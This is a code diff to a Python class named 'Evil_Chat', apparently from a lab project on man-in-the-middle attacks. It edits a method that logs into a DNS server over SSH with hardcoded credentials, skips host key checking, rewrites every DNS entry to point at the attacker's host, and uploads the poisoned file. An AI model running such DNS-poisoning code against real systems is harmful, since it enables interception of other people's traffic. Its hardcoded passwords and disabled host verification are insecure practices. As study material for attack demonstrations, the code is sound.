@@ -1,5 +1,6 @@
 import socket
 import paramiko
+from scp import SCPClient
 from config import dns_ip, mitm_ip, ports, msg_length
 from diffie_hellman import DH_exchanger
 
@@ -25,10 +26,11 @@ class Evil_Chat(object):
         #
         # Put the original file back
         ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(dns_ip, username="dns", password="password")
         sftp = ssh.open_sftp()
         localpath = 'dns_config'
-        remotepath = '~/MITM/'
+        remotepath = '/home/dns/MITM/dns_config'
         sftp.put(localpath, remotepath)
         sftp.close()
         ssh.close()
@@ -38,13 +40,13 @@ class Evil_Chat(object):
     def do_attack(self):
         # Get the dns table and modify it
         ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(dns_ip, username="dns", password="password")
         sftp = ssh.open_sftp()
-        localpath = ''
-        remotepath = '~/MITM/dns_config'
+        localpath = 'dns_config'
+        remotepath = '/home/dns/MITM/dns_config'
+
         sftp.get(remotepath, localpath)
-        sftp.close()
-        ssh.close()
 
         # keep a copy of the original dns config
         with open('dns_config', 'r') as f:
@@ -57,11 +59,6 @@ class Evil_Chat(object):
             f.write('\n'.join([f'{name}={mitm_ip}:{ports["mitm"]}' for name in self.dns_table.keys()]))
 
         # Put the evil file in te dns
-        ssh = paramiko.SSHClient()
-        ssh.connect(dns_ip, username="dns", password="password")
-        sftp = ssh.open_sftp()
-        localpath = 'dns_config'
-        remotepath = '~/MITM/'
         sftp.put(localpath, remotepath)
         sftp.close()
         ssh.close()
